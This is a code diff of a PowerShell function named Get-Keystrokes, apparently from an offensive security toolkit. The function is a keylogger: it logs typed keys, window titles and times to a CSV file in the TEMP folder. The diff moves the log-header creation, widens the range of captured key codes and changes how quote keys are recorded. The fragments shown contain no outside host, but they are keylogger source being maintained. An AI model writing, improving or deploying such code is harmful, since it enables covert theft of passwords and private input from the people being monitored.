@@ -40,8 +40,8 @@ function Get-Keystrokes {
     [CmdletBinding()] 
     Param (
         [Parameter(Position = 0)]
-        [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent $_)) -PathType Container})]
-        [String]$LogPath = "$($Env:TEMP)\key.log",
+        [ValidateScript({(Test-Path (Resolve-Path (Split-Path -Parent -Path $_)) -PathType Container)})]
+        [String]$LogPath = "$($env:TEMP)\key.log",
 
         [Parameter(Position = 1)]
         [Double]$Timeout,
@@ -51,6 +51,9 @@ function Get-Keystrokes {
     )
 
     $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)
+
+    try { '"TypedKey","WindowTitle","Time"' | Out-File -FilePath $LogPath -Encoding unicode }
+    catch { throw $_ }
 
     $Script = {
         Param (
@@ -161,8 +164,6 @@ function Get-Keystrokes {
     
         #endregion Imports
 
-        '"TypedKey","WindowTitle","Time"' | Out-File -FilePath $LogPath -Encoding unicode
-
         $CallbackScript = {
             Param (
                 [Parameter()]
@@ -218,7 +219,7 @@ function Get-Keystrokes {
                         111 { $Key = "/" }
                     }
                 }
-                elseif (($vKey -ge 48 -and $vKey -le 57) -or ($vKey -ge 186 -and $vKey -le 192) -or ($vKey -ge 219 -and $vKey -le 221)) {                      
+                elseif (($vKey -ge 48 -and $vKey -le 57) -or ($vKey -ge 186 -and $vKey -le 192) -or ($vKey -ge 219 -and $vKey -le 222)) {                      
                     if ($Shift) {                           
                         switch ($vKey.value__) { # Shiftable characters
                             48 { $Key = ')' }
@@ -241,7 +242,7 @@ function Get-Keystrokes {
                             219 { $Key = '{' }
                             220 { $Key = '|' }
                             221 { $Key = '}' }
-                            222 { $Key = '"' }
+                            222 { $Key = '<Double Quotes>' }
                         }
                     }
                     else {                           
@@ -266,7 +267,7 @@ function Get-Keystrokes {
                             219 { $Key = '[' }
                             220 { $Key = '\' }
                             221 { $Key = ']' }
-                            222 { $Key = "`'" }
+                            222 { $Key = '<Single Quote>' }
                         }
                     }
                 }
